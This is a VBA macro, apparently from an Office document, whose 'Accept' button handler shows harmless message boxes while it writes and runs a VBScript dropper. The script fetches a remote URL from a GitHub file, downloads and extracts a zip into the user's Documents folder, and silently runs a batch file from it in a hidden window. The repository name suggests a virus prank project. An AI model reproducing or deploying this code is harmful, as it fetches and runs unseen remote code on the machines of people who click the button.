Private Sub Accept_Click()
    MsgBox ("Accepting...")
    'Set WshShell = CreateObject("WScript.Shell")
    'strDocuments = WshShell.SpecialFolders("MyDocuments")
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim oFile As Object
    'Dim curPath As String
    'curPath = Application.ActiveWorkbook.Path
    Set oFile = fso.CreateTextFile(CurDir() & "\robr.vbs")
    oFile.WriteLine "strUser = CreateObject(""WScript.Network"").UserName"
    oFile.WriteLine "docFold = ""C:\Users\"" & strUser & ""\Documents\party\"""
    oFile.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
    oFile.WriteLine "If Not fso.FolderExists(docFold) Then"
    oFile.WriteLine "fso.CreateFolder docFold"
    oFile.WriteLine "End If"
    oFile.WriteLine "Set objXMLHTTP = CreateObject(""MSXML2.XMLHTTP"")"
    oFile.WriteLine "objXMLHTTP.open ""GET"", ""https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/dwn"", false"
    oFile.WriteLine "objXMLHTTP.send()"
    oFile.WriteLine "dwnn = objXMLHTTP.responseText"
    oFile.WriteLine "dim xHttp: Set xHttp = createobject(""Microsoft.XMLHTTP"")"
    oFile.WriteLine "dim bStrm: Set bStrm = createobject(""Adodb.Stream"")"
    oFile.WriteLine "xHttp.Open ""GET"", dwnn, False"
    oFile.WriteLine "xHttp.Send"
    oFile.WriteLine "with bStrm"
    oFile.WriteLine ".type = 1"
    oFile.WriteLine ".open"
    oFile.WriteLine ".write xHttp.responseBody"
    oFile.WriteLine ".savetofile docFold & ""zip.zip"", 2"
    oFile.WriteLine "end with"
    oFile.WriteLine "ZipFile=docFold & ""zip.zip"""
    oFile.WriteLine "ExtractTo=docFold"
    oFile.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
    oFile.WriteLine "If NOT fso.FolderExists(ExtractTo) Then"
    oFile.WriteLine "fso.CreateFolder(ExtractTo)"
    oFile.WriteLine "End If"
    oFile.WriteLine "set objShell = CreateObject(""Shell.Application"")"
    oFile.WriteLine "set FilesInZip=objShell.NameSpace(ZipFile).items"
    oFile.WriteLine "objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)"
    oFile.WriteLine "Set fso = Nothing"
    oFile.WriteLine "Set objShell = Nothing"
    oFile.WriteLine "Set WshShell = WScript.CreateObject (""WScript.Shell"")"
    oFile.WriteLine "WshShell.Run chr(34) & docFold & ""copy.bat"" & Chr(34), 0, false"
    oFile.WriteLine "Set WshShell = Nothing"
    oFile.Close
    exec
    MsgBox ("Accepted")
End Sub

Sub exec()
    'Dim s As String
    's =
    Shell "wscript """ & CurDir() & "\robr.vbs""", vbNormalFocus
End Sub

Sub test()
    MsgBox ("asd")
    exec
End Sub
